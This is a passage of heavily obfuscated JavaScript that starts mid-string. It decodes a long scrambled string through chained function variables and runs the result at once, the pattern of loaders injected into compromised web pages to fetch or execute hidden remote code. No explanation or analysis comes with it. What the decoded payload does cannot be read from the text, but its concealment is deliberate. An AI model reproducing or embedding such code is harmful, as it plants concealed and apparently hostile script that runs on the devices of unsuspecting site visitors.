fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

